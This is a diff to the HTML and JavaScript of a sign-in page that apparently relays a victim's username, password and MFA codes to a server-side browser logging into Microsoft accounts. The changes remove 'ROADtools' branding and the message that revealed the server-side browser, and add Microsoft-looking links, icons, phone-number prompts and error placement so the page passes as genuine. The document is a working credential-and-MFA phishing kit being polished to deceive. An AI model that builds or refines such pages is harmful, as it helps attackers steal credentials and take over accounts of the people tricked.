@@ -38,29 +38,30 @@
   }
   .top-loader {
     position: absolute;
-    top: -6px;
-    left: 50%;
-    transform: translateX(-50%);
-    display: flex;
-    gap: 10px;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 3px;
+    overflow: hidden;
+    border-radius: 4px 4px 0 0;
     opacity: 0;
     pointer-events: none;
     transition: opacity 0.15s ease;
   }
   .top-loader.visible { opacity: 1; }
-  .top-loader .dot {
-    width: 9px;
-    height: 9px;
-    border-radius: 50%;
+  .top-loader .sweep {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 40%;
     background: #2b5fd9;
-    animation: top-loader-pulse 1.4s ease-in-out infinite;
+    border-radius: inherit;
+    animation: top-loader-sweep 1.3s ease-in-out infinite;
   }
-  .top-loader .dot:nth-child(1) { animation-delay: 0s; }
-  .top-loader .dot:nth-child(2) { animation-delay: 0.2s; }
-  .top-loader .dot:nth-child(3) { animation-delay: 0.4s; }
-  @keyframes top-loader-pulse {
-    0%, 80%, 100% { opacity: 0.25; transform: scale(0.85); }
-    40% { opacity: 1; transform: scale(1); }
+  @keyframes top-loader-sweep {
+    0% { left: -40%; }
+    100% { left: 100%; }
   }
   .logo-mark {
     display: flex;
@@ -493,7 +494,7 @@
 
   <div class="card">
     <div class="top-loader" id="topLoader">
-      <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+      <span class="sweep"></span>
     </div>
     <div class="logo-mark">
       <div class="dot"></div>
@@ -521,7 +522,7 @@
         <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
       </div>
       <div class="links">
-        <div style="color:#666;">A browser window opened on the server — complete MFA there if prompted.</div>
+        <div><a href="#" onclick="return false;">Forgot my password</a></div>
       </div>
       <div class="actions">
         <button type="button" class="secondary" id="backBtn">Back</button>
@@ -530,10 +531,6 @@
     </form>
 
     <div id="mfaChoiceScreen" style="display:none;">
-      <div class="logo-mark">
-        <div class="dot"></div>
-        <span>ROADtools</span>
-      </div>
       <div class="mfa-header" id="mfaChoiceEmailRow"></div>
       <h1>Verify your identity</h1>
       <hr class="mfa-divider">
@@ -542,6 +539,7 @@
         <div style="color:#666;" id="mfaWaitingNote">
           <span class="dots-loader"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>Waiting for you to pick a method...
         </div>
+        <div style="color:#1b1b1b;">Are your verification methods current? Check at <a href="#" onclick="return false;">https://aka.ms/mfasetup</a></div>
       </div>
       <div class="mfa-cancel-row">
         <button type="button" class="secondary" id="mfaCancelBtn">Cancel</button>
@@ -549,10 +547,6 @@
     </div>
 
     <form id="mfaCodeForm" style="display:none;">
-      <div class="logo-mark">
-        <div class="dot"></div>
-        <span>ROADtools</span>
-      </div>
       <div class="mfa-header" id="mfaCodeEmailRow"></div>
       <h1>Enter code</h1>
       <div class="code-context">
@@ -563,6 +557,9 @@
       </div>
       <div class="field">
         <input type="text" id="mfaCode" placeholder="Code" inputmode="numeric" autocomplete="one-time-code" required>
+      </div>
+      <div class="links">
+        <div>Having trouble? <a href="#" data-back>Sign in another way</a></div>
       </div>
       <div class="actions">
         <button type="submit" class="primary" id="mfaCodeBtn">Verify</button>
@@ -776,10 +773,28 @@ function showScreen(name) {
   document.querySelector(".wrapper").style.display = name === "orgLogin" ? "none" : "block";
   document.getElementById("orgLoginPage").style.display = name === "orgLogin" ? "flex" : "none";
 
+  // Only clear the typed password once we've actually left this screen —
+  // clearing it immediately on submit (while still showing this screen
+  // during the post-submit wait) looked like the input had silently failed.
+  if (passwordForm.style.display !== "none" && name !== "password") {
+    passwordInput.value = "";
+  }
+
   usernameForm.style.display = name === "username" ? "block" : "none";
   passwordForm.style.display = name === "password" ? "block" : "none";
+  optionsCard.style.display = name === "username" ? "flex" : "none";
   mfaChoiceScreen.style.display = name === "mfaChoice" ? "block" : "none";
   mfaCodeForm.style.display = name === "mfaCode" ? "block" : "none";
+
+  // #status is shared across screens; keep it positioned right after the
+  // active screen's heading (matching Microsoft's own error placement)
+  // instead of leaving it wherever it last was — otherwise it can end up
+  // nested inside a now-hidden form and silently disappear.
+  const screenContainer = { username: usernameForm, password: passwordForm, mfaChoice: mfaChoiceScreen, mfaCode: mfaCodeForm }[name];
+  if (screenContainer) {
+    const heading = screenContainer.querySelector("h1");
+    if (heading) heading.insertAdjacentElement("afterend", statusEl);
+  }
 
   if (name === "mfaChoice" || name === "mfaCode") {
     const emailHtml = `<span class="back-arrow" data-back>&larr;</span><span>${currentUsername || ""}</span>`;
@@ -791,7 +806,7 @@ function showScreen(name) {
 function _mfaOptionIcon(label) {
   const lower = label.toLowerCase();
   if (lower.includes("authenticator")) {
-    return `<div class="icon-box"><svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-6 8-6s8 2 8 6"/></svg></div>`;
+    return `<div class="icon-box"><svg width="36" height="36" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#1b1b1b"/><circle cx="12" cy="9.5" r="3.5" fill="#fff"/><path d="M4 20c0-4 3.6-6.5 8-6.5s8 2.5 8 6.5" fill="#fff"/></svg></div>`;
   }
   if (lower.includes("verification code") || lower.includes("use a verification")) {
     return `<div class="icon-box"><div class="icon-123">123</div></div>`;
@@ -800,7 +815,7 @@ function _mfaOptionIcon(label) {
     return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div>`;
   }
   if (lower.startsWith("call")) {
-    return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5a2 2 0 0 1 2-2h3l2 5-2 2a12 12 0 0 0 6 6l2-2 5 2v3a2 2 0 0 1-2 2A16 16 0 0 1 3 5z"/><path d="M17 11l3-3"/><path d="M17 5h3v3"/></svg></div>`;
+    return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5a2 2 0 0 1 2-2h3l2 5-2 2a12 12 0 0 0 6 6l2-2 5 2v3a2 2 0 0 1-2 2A16 16 0 0 1 3 5z"/><path d="M22 6l-4 4"/><path d="M22 10V6h-4"/></svg></div>`;
   }
   // "I can't use my Authenticator app" or anything unrecognized -> a generic key/switch icon
   return `<div class="icon-box"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="4.5"></circle><path d="M10.5 12.5L20 3"></path><path d="M16 7l3 3"></path><path d="M13 4l3 3"></path></svg></div>`;
@@ -823,6 +838,7 @@ function renderMfaOptions(options) {
         // DOM updates to the new screen (e.g. all 4 picker options) quickly,
         // giving the server-side page a brief moment to actually render it.
         stopPolling();
+        startWaitingLoader();
         setTimeout(pollStatus, 600);
       } catch (err) {
         setStatus(err.message, "error");
@@ -835,12 +851,26 @@ function renderMfaOptions(options) {
 }
 
 let pollHandle = null;
+let waitingLoaderActive = false;
+
+function startWaitingLoader() {
+  if (waitingLoaderActive) return;
+  waitingLoaderActive = true;
+  showTopLoader();
+}
+
+function stopWaitingLoader() {
+  if (!waitingLoaderActive) return;
+  waitingLoaderActive = false;
+  hideTopLoader();
+}
 
 function stopPolling() {
   if (pollHandle) {
     clearTimeout(pollHandle);
     pollHandle = null;
   }
+  stopWaitingLoader();
 }
 
 async function pollStatus() {
@@ -850,22 +880,31 @@ async function pollStatus() {
     const data = await getJSON(`/login/status/${encodeURIComponent(currentUsername)}`);
 
     if (data.stage === "awaiting_mfa_choice") {
+      // Idle waiting for the user to pick a method — polling keeps running
+      // in the background (to catch a push approval), but nothing is
+      // actively in flight, so the loading bar shouldn't show here.
+      stopWaitingLoader();
       showScreen("mfaChoice");
       renderMfaOptions(data.mfa_options || []);
       setStatus("");
     } else if (data.stage === "awaiting_mfa_code") {
+      // Idle waiting for the user to type/receive a code — same reasoning
+      // as the MFA-choice screen above.
+      stopWaitingLoader();
       showScreen("mfaCode");
       if (lastSelectedMfaOption) {
         const lower = lastSelectedMfaOption.toLowerCase();
+        const numberMatch = lastSelectedMfaOption.match(/\+.*$/);
+        const number = numberMatch ? ` ${numberMatch[0]}.` : "";
         if (lower.startsWith("call")) {
-          mfaCodeContextText.textContent = `We called your phone. Please enter the code to sign in.`;
+          mfaCodeContextText.textContent = `We called your phone${number} Please enter the code to sign in.`;
         } else if (lower.startsWith("text")) {
-          mfaCodeContextText.textContent = `We texted your phone. Please enter the code to sign in.`;
+          mfaCodeContextText.textContent = `We texted your phone${number} Please enter the code to sign in.`;
         } else {
           mfaCodeContextText.textContent = `Please enter your verification code to sign in.`;
         }
       }
-      setStatus("Enter the code you received.");
+      setStatus("");
       mfaCodeInput.focus();
     } else if (data.stage === "succeeded") {
       stopPolling();
@@ -897,7 +936,6 @@ usernameForm.addEventListener("submit", async (e) => {
   if (!username) return;
 
   setBusy(usernameBtn, true, "Next");
-  setStatus("Opening browser and entering username...", "info", true);
   resultEl.style.display = "none";
 
   try {
@@ -921,7 +959,7 @@ usernameForm.addEventListener("submit", async (e) => {
         orgPassword.focus();
       }, 1800);
     } else {
-      setStatus("Username accepted. Enter password to continue.", "success");
+      setStatus("");
       showScreen("password");
       passwordInput.focus();
     }
@@ -980,6 +1018,7 @@ orgLoginForm.addEventListener("submit", async (e) => {
     await postJSON("/login/org-signin", { username: currentUsername, email, password });
     orgPassword.value = "";
     setOrgStatus("");
+    startWaitingLoader();
     pollStatus();
   } catch (err) {
     setOrgStatus(err.message, "error");
@@ -1031,8 +1070,8 @@ passwordForm.addEventListener("submit", async (e) => {
 
   try {
     await postJSON("/login/password", { username: currentUsername, password });
-    passwordInput.value = "";
     setStatus("");
+    startWaitingLoader();
     pollStatus();
   } catch (err) {
     setStatus(err.message, "error");
@@ -1053,12 +1092,15 @@ mfaCodeForm.addEventListener("submit", async (e) => {
     await postJSON("/login/mfa-code", { username: currentUsername, code });
     mfaCodeInput.value = "";
     setStatus("Code submitted, waiting for confirmation...");
+    startWaitingLoader();
   } catch (err) {
     setStatus(err.message, "error");
   } finally {
     setBusy(mfaCodeBtn, false, "Verify");
   }
 });
+
+showScreen("username");
 </script>
 
 </body>
